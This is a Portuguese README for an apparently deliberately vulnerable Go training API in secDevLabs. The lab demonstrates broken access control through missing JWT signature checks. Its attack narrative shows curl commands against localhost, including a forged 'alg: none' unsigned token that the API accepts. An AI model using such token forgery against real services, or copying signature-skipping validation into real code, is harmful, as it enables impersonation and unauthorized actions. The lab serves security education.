

# Camp Crystal Lake API

[Access content in English](README.md)

<p align="center">
    <img src="images/camplake.png" width="400" height="400"/>
</p>

A API do Camp Crystal Lake é um aplicativo web simples de Golang que contém um exemplo de vulnerabilidade de controle de acesso quebrado e seu principal objetivo é descrever como um usuário mal-intencionado pode explorá-lo.

## Index

- [Definição](#o-que-é-quebra-de-controle-de-acesso)
- [Como inicializar o aplicativo?](#como-inicializar-o-aplicativo)
- [Narrativa de ataque](#narrativa-de-ataque)
- [Objetivos](#proteger-este-aplicativo)
- [Soluções](#pr-soluções)
- [Contribuição](#contribuição)

## O que é quebra de controle de acesso?

O controle de acesso impõe a política de forma que os usuários não possam agir fora de suas permissões pretendidas. As falhas geralmente levam à divulgação, modificação ou destruição de informações não autorizada dos dados ou à execução de uma função fora dos limites de acesso do usuário.

Os invasores podem explorar essas falhas para acessar funcionalidades e/ou dados não autorizados, como acesso a contas de outros usuários, visualizar arquivos confidenciais, modificar dados de outros usuários, alterar direitos de acesso, etc.

O principal objetivo deste aplicativo é discutir como as vulnerabilidades do **Quebra de Controle de Acesso** podem ser exploradas e incentivar os desenvolvedores a enviar solicitações pull no **SecDevLabs** sobre como eles corrigiriam essas falhas.

## Como inicializar o aplicativo?

Para iniciar este **aplicativo inseguro** intencionalmente, você precisará do [Docker][Docker Install] e do [Docker Compose][Docker Compose Install]. Depois de clonar o repositório [secDevLabs](https://github.com/globocom/secDevLabs), no seu computador, você deve digitar os seguintes comandos para iniciar o aplicativo:

```sh
cd secDevLabs/owasp-top10-2021-apps/a1/camp-lake-api
```

```sh
make install
```

Depois é só visitar [localhost:20001][App] ! 😆

## Conheça o app 💵

Para entender corretamente como esse aplicativo funciona, você pode seguir esses passo a passo:

- Registrar um usuário;
- Realizar um login;
- Criar um novo post.

## Narrativa de ataque

Agora que você conhece o propósito deste aplicativo, o que pode dar errado? A seção a seguir descreve como um invasor pode identificar e, eventualmente, encontrar informações confidenciais sobre o aplicativo ou seus usuários. Recomendamos que você siga estas etapas e tente reproduzi-las por conta própria para entender melhor o ataque! 😜

### 👀

#### A validação incorreta do JWT, permite que usuários mal-intencionados criem tokens falsos e abusem da não validação do JWT. Um exemplo da não validação do JWT é não validar o algoritmo de assinatura usado.

Para entender melhor como a API funciona, criaremos um novo usuário.

Para este exemplo, criamos o usuário com as seguintes credenciais de login - `campLakeAdmin:campLake2021`

```sh
curl -s -H "Content-Type: application/json" -d '{"username":"campLakeAdmin","password":"campLake2021"}' http://localhost:20001/register  
```

<p align="center">
    <img src="images/attack_1.png"/>
</p>

Com o usuário criado, faremos login no aplicativo com suas credenciais para obter o token JWT. Por se tratar de um aplicativo de teste, o token JWT é devolvido ao usuário assim que ele efetua o login.

```sh
curl -s -H "Content-Type: application/json" -d '{"username":"campLakeAdmin","password":"campLake2021"}' http://localhost:20001/login
```

<p align="center">
    <img src="images/attack_2.png"/>
</p>

<p align="center">
    <img src="images/attack_4.png"/>
</p>

De posse do token JWT, podemos criar um novo post na API, fazendo uma requisição POST diretamente para a rota autenticada `newPost`.

```sh
curl -s -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhbXBMYWtlQWRtaW4iLCJleHAiOjE2MzMzODI5MzR9.aW4BTVuXaozSbF6EAJfRNsApRA_1hfk2OhaLAo250Uo' -d '{"title": "New member ", "post": "Today a new member ..."}' http://localhost:20001/newpost
```

<p align="center">
    <img src="images/attack_3.png"/>
</p>

### 🔥

Porém, a API não verifica a assinatura utilizada pelo token JWT, qualquer usuário malicioso pode criar um token falso, conforme mostra a imagem:

<p align="center">
    <img src="images/attack_5.png"/>
</p>

```sh
curl -s -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6Imphc29uVm9vcmhlc3MiLCJleHAiOjE2MzMzODM1ODZ9.' -d '{"title": "New member ", "post": "Today a new member ..."}' http://localhost:20001/newpost
```

<p align="center">
    <img src="images/attack_6.png"/>
</p>


## Proteger este aplicativo

Como você arrumaria essa vulnerabilidade? Após suas alterações, um invasor não poderá:

* Usar tokens falsos sem uma assinatura válida.
* Alterar outros usuários por meio da manipulação do JWT.

## PR Soluções

[Alerta de spoiler  🚨 ] Para entender como essa vulnerabilidade pode ser resolvida, confira [these pull requests]()!

## Contribuição

Nós encorajamos você a contribuir com o SecDevLabs! Por favor, confira a seção [Contribuição no SecDevLabs](../../../docs/CONTRIBUTING.md) para orientações sobre como proceder !🎉

[Docker Install]:  https://docs.docker.com/install/
[Docker Compose Install]: https://docs.docker.com/compose/install/
[App]: http://localhost:10005
[secDevLabs]: https://github.com/globocom/secDevLabs
[2]:https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2017-apps/a5/ecommerce-api
